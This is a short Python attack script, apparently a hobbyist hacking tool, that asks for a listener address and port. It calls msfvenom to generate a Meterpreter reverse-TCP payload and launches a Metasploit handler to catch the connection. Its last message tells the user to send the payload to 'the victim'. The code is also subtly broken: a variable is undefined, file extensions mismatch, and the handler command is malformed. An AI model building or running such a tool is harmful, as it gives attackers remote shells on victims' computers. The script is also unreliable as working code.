from check import *
import os
import sys
import socket

check_root()
check_os()
clear()

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_status = (s.getsockname()[0])
except OSError:
    print('\n[!]No Internet{!}\n')
    sys.exit()

logo = f'''
                 .88888888:. 
                88888888.88888. 
              .8888888888888888. 
              888888888888888888 
              88' _`88'_  `88888 
              88 88 88 88  88888 
              88_88_::_88_:88888 
              88:::,::,:::::8888 
              88`:::::::::'`8888 
             .88  `::::'    8:88. 
            8888            `8:888. 
          .8888'             `888888. 
          .8888:..  .::.  ...:'8888888:. 
        .8888.'     :'     `'::`88:88888 
       .8888        '         `.888:8888. 
      888:8         .           888:88888 
    .888:88        .:           888:88888: 
    8888888.       ::           88:888888 
    `.::.888.      ::          .88888888 
   .::::::.888.    ::         :::`8888'.:. 
  ::::::::::.888   '         .:::::::::::: 
  ::::::::::::.8    '      .:8::::::::::::. 
 .::::::::::::::.        .:888::::::::::::: 
 :::::::::::::::88:.__..:88888:::::::::::' 
  `'.:::::::::::88888888888.88:::::::::' 
        `':::_:' -- '' -'-' `':_::::'`

Code by: mython-dev:)
Instagram: @h4ckerworld or @mython-dev  

'''


def payloads():
    print(logo)
    try:
        print(f'Your LHOST: "{ip_status}"\n')
        lhost = input(f'Enter LHOST: ')
        print(f'Port example: "4444"')
        lport = input(f'Enter lport: ')
    except KeyboardInterrupt:
        print('\nВыход!\n')
        sys.exit()

    # i use payload for linux python/meterpreter/reverse_tcp

    os.system(f'msfvenom -p python/meterpreter/reverse_tcp lhost={lhost} lport={lport} R > {directory}/mythicalpayload.py')

    print(f'\nSaved payload: {directory}/mythicalpayload.apk\n')

    os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp  set lhost {lhost} ; set lport {lport} ; run ; "')

    print(f'\nSend the newly created payload to the victim: {directory}/mythicalpayload.py\n')

payloads()

